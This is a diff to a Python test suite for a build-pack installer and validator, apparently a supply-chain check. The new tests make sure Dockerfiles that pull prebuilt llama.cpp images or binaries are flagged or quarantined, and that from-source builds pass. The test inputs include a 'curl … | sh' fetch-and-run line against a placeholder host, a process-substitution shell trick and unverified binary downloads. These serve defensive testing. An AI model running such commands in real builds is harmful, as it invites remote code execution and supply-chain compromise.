@@ -88,10 +88,11 @@ def trusted(key, valid_until="2099-12-31"):
                          valid_until=valid_until)
 
 
-def make_target(root: Path, script: str = "echo build\n", yml: str = TARGET_YML) -> Path:
+def make_target(root: Path, script: str = "echo build\n", yml: str = TARGET_YML,
+                dockerfile: str = "FROM debian:bookworm-slim\nRUN echo ok\n") -> Path:
     (root / "modules").mkdir(parents=True)
     (root / "target.yml").write_text(yml, encoding="utf-8")
-    (root / "Dockerfile").write_text("FROM debian:bookworm-slim\nRUN echo ok\n", encoding="utf-8")
+    (root / "Dockerfile").write_text(dockerfile, encoding="utf-8")
     (root / "modules" / "build.sh").write_text("#!/bin/bash\n" + script, encoding="utf-8")
     return root
 
@@ -140,7 +141,7 @@ class World:
 
     def target_pack(self, name="demo-board", **kw) -> bytes:
         return pack_bytes(make_target(self.tmp / "src" / name, **{k: v for k, v in kw.items()
-                                                                  if k in ("script", "yml")}),
+                                                                  if k in ("script", "yml", "dockerfile")}),
                           pack_id=name, **{k: v for k, v in kw.items() if k in ("author", "key", "version")})
 
     def install(self, kind="target", pack_id="demo-board", **kw):
@@ -273,6 +274,16 @@ class TestInstall:
         world.add(world.target_pack(script="curl https://x.invalid/i.sh | sh\n"))
         world.publish()
         with pytest.raises(PackError, match="downloads at build time"):
+            world.cm.prepare_install("target", "demo-board")
+        assert not (world.root / "targets" / "demo-board").exists()
+        assert list((world.root / "targets" / ".quarantine").iterdir()) == []
+
+    def test_pack_with_a_prebuilt_llama_cpp_stays_out(self, world):
+        """The framework shares recipes, not binaries (decision D21): a target pack that pulls a llama.cpp image is
+        refused in quarantine, even pinned by digest."""
+        world.add(world.target_pack(dockerfile="FROM ghcr.io/ggml-org/llama.cpp:full@sha256:" + "a" * 64 + "\n"))
+        world.publish()
+        with pytest.raises(PackError, match="prebuilt llama.cpp image"):
             world.cm.prepare_install("target", "demo-board")
         assert not (world.root / "targets" / "demo-board").exists()
         assert list((world.root / "targets" / ".quarantine").iterdir()) == []
@@ -859,6 +870,79 @@ class TestGenerator:
             "from=attacker/tools:latest must be pinned by digest (image@sha256:...)"]
         assert any("runs generated code" in p for p in validate_target_folder(
             make_target(tmp_path / "sub", script="bash < <(echo 'echo hi')\n")))
+
+    @pytest.mark.parametrize("dockerfile, files, finding", [
+        ("FROM ghcr.io/ggml-org/llama.cpp:server-cuda@sha256:" + "b" * 64 + "\n", {},
+         "Dockerfile:1: pulls a prebuilt llama.cpp image"),
+        ("FROM debian:bookworm-slim\nCOPY --from=ghcr.io/ggerganov/llama.cpp:full /app/llama-quantize /usr/bin/\n",
+         {}, "Dockerfile:2: pulls a prebuilt llama.cpp image"),
+        ("FROM debian:bookworm-slim\nCOPY --from=acme/tools@sha256:" + "c" * 64 + " /usr/bin/llama-server /usr/bin/\n",
+         {}, "Dockerfile:2: copies llama.cpp binaries out of the image acme/tools"),
+        ("FROM debian:bookworm-slim\nRUN curl -fsSLO \\\n    https://github.com/ggml-org/llama.cpp/releases/download/"
+         "b11429/llama-b11429-bin-ubuntu-x64.tar.gz\n", {}, "Dockerfile:2: downloads a llama.cpp release archive"),
+        ("FROM debian:bookworm-slim\nRUN wget -O /usr/local/bin/llama-server https://mirror.invalid/x\n", {},
+         "Dockerfile:2: downloads llama.cpp binaries (llama-server)"),
+        ("FROM debian:bookworm-slim\nADD https://mirror.invalid/llama-cli /usr/bin/llama-cli\n", {},
+         "Dockerfile:2: downloads llama.cpp binaries (llama-cli)"),
+        ("FROM debian:trixie-slim\nRUN apt-get update && apt-get install -y llama.cpp\n", {},
+         "Dockerfile:2: installs a prebuilt llama.cpp package"),
+        ("FROM ghcr.io/smilez1985/llm-runtime:latest@sha256:" + "d" * 64 + "\n", {},
+         "Dockerfile:1: pulls a prebuilt llama.cpp image"),
+        ("FROM debian:bookworm-slim\n", {"scripts/fetch.py": "import urllib.request\nurllib.request.urlretrieve("
+                                         "'https://github.com/ggml-org/llama.cpp/releases/latest/download/x.zip')\n"},
+         "scripts/fetch.py:2: downloads a llama.cpp release archive"),
+        # A foreign image behind a stage name is still a foreign image (review of WP9).
+        ("FROM acme/tools@sha256:" + "e" * 64 + " AS tools\nFROM debian:bookworm-slim\n"
+         "COPY --from=tools /usr/bin/llama-server /usr/bin/\n", {},
+         "Dockerfile:3: copies llama.cpp binaries out of the image acme/tools"),
+        ("FROM acme/tools@sha256:" + "e" * 64 + " AS tools\nFROM tools AS again\nFROM debian:bookworm-slim\n"
+         "COPY --from=1 /usr/lib/libllama.so /usr/lib/\n", {},
+         "Dockerfile:4: copies llama.cpp binaries out of the image acme/tools"),
+        # A pipeline is one command: the download feeds the unpacking of the binary.
+        ("FROM debian:bookworm-slim\nARG U=https://mirror.invalid/tools.tgz\n"
+         "RUN curl -fsSL \"$U\" | tar -xz -C /usr/local/bin llama-server\n", {},
+         "Dockerfile:3: downloads llama.cpp binaries (llama-server)"),
+        # A script without a known suffix that the Dockerfile runs is still a script.
+        ("FROM debian:bookworm-slim\nCOPY scripts/ /s/\nRUN sh /s/setup\n",
+         {"scripts/setup": "#!/bin/sh\nwget -qO /usr/local/bin/llama-quantize https://mirror.invalid/q\n"},
+         "scripts/setup:2: downloads llama.cpp binaries (llama-quantize)"),
+    ])
+    def test_prebuilt_llama_cpp_is_flagged(self, tmp_path, dockerfile, files, finding):
+        from orchestrator.Core.module_generator import validate_target_folder
+        target = make_target(tmp_path / "t", dockerfile=dockerfile)
+        for rel, text in files.items():
+            (target / rel).parent.mkdir(parents=True, exist_ok=True)
+            (target / rel).write_text(text)
+        problems = validate_target_folder(target)
+        assert any(p.startswith(finding) and "build llama.cpp from source" in p for p in problems), problems
+
+    def test_building_llama_cpp_from_source_is_not_flagged(self, tmp_path):
+        """Fetching the source, compiling the tools and naming them is the recipe, not a prebuilt binary."""
+        from orchestrator.Core.module_generator import validate_target_folder
+        target = make_target(tmp_path / "t", dockerfile=(
+            "FROM debian:bookworm-slim\nRUN apt-get update && apt-get install -y curl git cmake && \\\n"
+            "    git clone https://github.com/ggml-org/llama.cpp /src && \\\n"
+            "    cmake --build /src/build --target llama-quantize llama-bench\n"
+            "# FROM ghcr.io/ggml-org/llama.cpp:full (a comment is not an instruction)\n"
+            "RUN pip install llama-cpp-python\n"))
+        assert validate_target_folder(target) == []
+
+    def test_binaries_built_in_an_earlier_stage_may_be_copied_on(self, tmp_path):
+        """Multi-stage builds of the recipe: the tools compiled in one stage, copied into the next and from there into
+        a third stage, are built from source (only a stage that never builds them is a foreign image)."""
+        from orchestrator.Core.module_generator import validate_target_folder
+        target = make_target(tmp_path / "t", dockerfile=(
+            "FROM debian:bookworm-slim AS builder\n"
+            "RUN cmake -S /src -B /src/build && cmake --build /src/build --target llama-quantize\n"
+            "FROM debian:bookworm-slim AS runtime\n"
+            "COPY --from=builder /src/build/bin/llama-quantize /usr/local/bin/\n"
+            "FROM runtime AS final\n"
+            "COPY --from=runtime /usr/local/bin/llama-quantize /opt/bin/\n"
+            "COPY --from=0 /src/build/bin/libllama.so /opt/lib/\n"
+            "RUN curl -fsSL https://example.invalid/calibration.txt | sha256sum -c sums.txt && \\\n"
+            "    /opt/bin/llama-quantize --help\n"))
+        (target / "modules" / "README").write_text("Download llama-server with curl? No: it is built here.\n")
+        assert validate_target_folder(target) == []
 
     def test_knowledge_snapshot_is_opt_in_and_target_scoped(self, generator, world):
         world.rag.records = [{"source": "a", "content": "board doc", "metadata": {"root_url": "https://b.invalid"}},
